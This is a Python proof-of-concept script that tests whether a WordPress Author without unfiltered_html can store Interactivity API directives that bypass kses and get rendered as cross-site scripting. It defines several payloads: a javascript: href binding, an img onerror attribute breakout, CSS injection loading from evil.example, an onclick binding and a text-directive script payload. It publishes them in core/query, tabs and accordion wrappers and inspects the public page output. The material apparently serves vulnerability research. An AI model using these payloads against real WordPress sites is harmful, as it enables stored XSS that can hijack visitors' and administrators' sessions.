#!/usr/bin/env python3
"""
Does an Author (no unfiltered_html) get Interactivity API directives past kses
into a published post, and does the server-side directive processor then act on
them?

kses treats `data-*` as a global attribute (_wp_add_global_attributes), and
`data-wp-bind--href` matches its /^data-[a-z0-9_-]+$/ name test, so the
directives survive.  WP_Block::render() runs wp_interactivity_process_directives()
over the ENTIRE rendered output of the outermost block whose
supports.interactivity is true -- inner blocks included.
"""
import re
import requests
from wplab import sess, BASE

author = sess("author")
anon = requests.Session()

PAYLOADS = {
    "href javascript:": (
        """<p data-wp-interactive='{"namespace":"pwn"}' """
        """data-wp-context='{"u":"javascript:alert(document.domain)"}'>"""
        """<a data-wp-bind--href="context.u">CLICKME-HREF</a></p>"""
    ),
    "src on img": (
        """<p data-wp-interactive='{"namespace":"pwn"}' """
        """data-wp-context='{"u":"x\\" onerror=\\"alert(1)"}'>"""
        """<img data-wp-bind--src="context.u" alt="IMGTEST"></p>"""
    ),
    "style injection": (
        """<p data-wp-interactive='{"namespace":"pwn"}' """
        """data-wp-context='{"c":"red;background:url(//evil.example/x)"}' """
        """data-wp-style--color="context.c">STYLETEST</p>"""
    ),
    "bind onclick (blocked svr)": (
        """<p data-wp-interactive='{"namespace":"pwn"}' """
        """data-wp-context='{"u":"alert(document.domain)"}'>"""
        """<b data-wp-bind--onclick="context.u">CLICKME-ONCLICK</b></p>"""
    ),
    "text directive": (
        """<p data-wp-interactive='{"namespace":"pwn"}' """
        """data-wp-context='{"t":"<img src=x onerror=alert(1)>"}' """
        """data-wp-text="context.t">TEXTTEST</p>"""
    ),
}

WRAPPERS = {
    "core/query": ('<!-- wp:query {"queryId":1,"query":{"perPage":1,"postType":"post"}} -->\n'
                   '<div class="wp-block-query">%s</div>\n<!-- /wp:query -->'),
    "core/tabs": ('<!-- wp:tabs -->\n<div class="wp-block-tabs">%s</div>\n<!-- /wp:tabs -->'),
    "core/accordion": ('<!-- wp:accordion -->\n<div class="wp-block-accordion">%s</div>\n'
                       '<!-- /wp:accordion -->'),
    "NO wrapper (control)": "%s",
}


def make(title, content):
    r = author.rest("POST", "/wp/v2/posts", json={
        "title": title, "content": content, "status": "publish"})
    j = r.json()
    return j.get("id"), j


for wname, wrap in WRAPPERS.items():
    print("=" * 78)
    print("WRAPPER:", wname)
    print("=" * 78)
    for pname, payload in PAYLOADS.items():
        inner = "<!-- wp:html -->\n%s\n<!-- /wp:html -->" % payload
        pid, j = make(f"iapi {wname} {pname}", wrap % inner)
        if pid is None:
            print(f"  {pname:28s} CREATE FAILED {str(j)[:120]}")
            continue
        stored = j["content"]["raw"] if "raw" in j.get("content", {}) else ""
        html = anon.get(BASE + f"/?p={pid}").text
        # what survived storage
        kept = [d for d in ("data-wp-interactive", "data-wp-context", "data-wp-bind",
                            "data-wp-style", "data-wp-text") if d in stored]
        # what the front end emitted near our marker
        frag = ""
        for m in re.finditer(r"<[^>]*data-wp-[^>]*>", html):
            frag += m.group(0) + "\n           "
        print(f"  {pname:28s} post={pid} stored-directives={kept}")
        if frag.strip():
            print("           FRONTEND> " + frag.strip()[:600])
        else:
            print("           FRONTEND> (no data-wp-* elements rendered)")
    print()
